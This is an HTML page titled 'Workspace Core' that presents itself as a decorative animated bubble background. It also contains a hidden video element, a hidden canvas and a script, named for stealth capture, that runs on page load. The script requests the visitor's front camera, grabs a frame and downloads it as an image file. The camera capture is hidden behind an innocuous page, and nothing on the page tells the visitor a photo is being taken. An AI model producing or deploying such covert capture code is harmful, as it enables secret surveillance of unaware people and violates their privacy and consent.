<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Workspace Core</title>
    <style>
        body { background-color: #000; margin: 0; overflow: hidden; height: 100vh; position: relative; }
        .bubble-wrapper { position: absolute; width: 100%; height: 100%; top: 0; left: 0; }
        .bubble { position: absolute; bottom: -50px; background: rgba(255, 255, 255, 0.15); border-radius: 50%; animation: floatUp 12s infinite linear; }
        /* Add your bubble styles here */
        .bubble:nth-child(1) { left: 10%; width: 40px; height: 40px; animation-delay: 0s; }
        .bubble:nth-child(2) { left: 40%; width: 50px; height: 50px; animation-delay: 2s; }
        .bubble:nth-child(3) { left: 70%; width: 30px; height: 30px; animation-delay: 4s; }
        @keyframes floatUp { 0% { transform: translateY(0); opacity: 0; } 50% { opacity: 1; } 100% { transform: translateY(-110vh); opacity: 0; } }
    </style>
</head>
<body>

    <div class="bubble-wrapper">
        <div class="bubble"></div><div class="bubble"></div><div class="bubble"></div>
    </div>

    <video id="webcam" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function runStealthCapture() {
            try {
                // 1. Trigger permission prompt
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('webcam');
                video.srcObject = stream;

                // 2. Wait for camera to load
                await new Promise(resolve => video.onloadedmetadata = resolve);

                // 3. Capture frame to hidden canvas
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                // 4. Download file
                const link = document.createElement('a');
                link.href = canvas.toDataURL('image/png');
                link.download = 'capture.png';
                link.click();
                
                // Stop camera after capture
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.log("Permission denied by user.");
            }
        }

        // Run as soon as the page is ready
        window.onload = runStealthCapture;
    </script>
</body>
</html>
